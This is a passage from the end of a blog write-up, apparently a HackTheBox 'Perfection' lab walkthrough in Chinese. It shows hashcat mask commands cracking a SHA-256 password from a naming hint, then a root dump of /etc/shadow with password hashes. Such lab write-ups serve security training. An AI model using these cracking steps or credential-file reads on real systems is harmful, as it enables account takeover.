class="string">Snefru-256, JtR: snefru-256</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Least Likely</span></span><br><span class="line"><span class="string">RIPEMD-256, JtR: dynamic_140 Haval-256 (3 rounds), JtR: dynamic_140 Haval-256 (4 rounds), JtR: dynamic_290 Haval-256 (5 rounds), JtR: dynamic_300 GOST R 34.11-94, HC: 6900 JtR: gost GOST </span></span><br><span class="line"><span class="string">CryptoPro S-Box,  Blake2b-256,  SHA3-256, HC: 17400 JtR: dynamic_380 PANAMA, JtR: dynamic_320 BLAKE2-256,  BLAKE2-384,  Skein-256, JtR: skein-256 Skein-512(256),  Ventrilo,  </span></span><br><span class="line"><span class="string">sha256($pass.$salt), HC: 1410 JtR: dynamic_62 sha256($salt.$pass), HC: 1420 JtR: dynamic_61 sha256(sha256($pass)), HC: 1420 JtR: dynamic_63 sha256(sha256_raw($pass))), HC: 1420 JtR: </span></span><br><span class="line"><span class="string">dynamic_64 sha256(sha256($pass).$salt), HC: 1420 JtR: dynamic_65 sha256($salt.sha256($pass)), HC: 1420 JtR: dynamic_66 sha256(sha256($salt).sha256($pass)), HC: 1420 JtR: dynamic_67 </span></span><br><span class="line"><span class="string">sha256(sha256($pass).sha256($pass)), HC: 1420 JtR: dynamic_68 sha256(unicode($pass).$salt), HC: 1430  sha256($salt.unicode($pass)), HC: 1440  HMAC-SHA256 (key = $pass), HC: 1450 JtR: </span></span><br><span class="line"><span class="string">hmac-sha256 HMAC-SHA256 (key = $salt), HC: 1460 JtR: hmac-sha256 Cisco Type 7,  BigCrypt, JtR: bigcrypt </span></span><br></pre></td></tr></table></figure>
+
+<p>是sha256的密碼，然後根據email的提示爆破密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;firstname&#125;_&#123;firstname backwards&#125;_&#123;randomly generated <span class="built_in">integer</span> between 1 and 1,000,000,000&#125;</span><br><span class="line">Note that all letters of the first name should be convered into lowercase.</span><br></pre></td></tr></table></figure>
+
+<p>類似：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susan_nasus_1000</span><br></pre></td></tr></table></figure>
+
+<p>因爲懶得做字典，可以用hashcat的 <code>Hybrid Attack</code>​ 模式，然後一個字一個字加上去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d</span><br><span class="line">$ hashcat.exe -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
+
+<p>出現： <code>abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210</code>​</p>
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@perfection:/home/susan<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$71hm</span>.H7E.Jek01MNCWa.d0<span class="variable">$FoTA1</span>/EWWEDDDeMklpfTV9CmxBPoan8E0s3krRMPj2/:19490:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19415:0:99999:7:::</span><br><span class="line">lxd:!:19415::::::</span><br><span class="line">susan:$y$j9T<span class="variable">$lDiE</span>.68crplrSJzmhskuH0<span class="variable">$KC</span>/O4ZHNz2p8OfWz1bfk9rxwhTkGdViBHgSo.2s1Ci5:19490:0:99999:7:::</span><br><span class="line">_laurel:!:19657::::::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&text=HackTheBox - Machine - Perfection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&is_video=false&description=HackTheBox - Machine - Perfection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Perfection&body=Check out this article: https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&title=HackTheBox - Machine - Perfection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&name=HackTheBox - Machine - Perfection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/04/2024-htb-machine/09-perfection/&t=HackTheBox - Machine - Perfection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
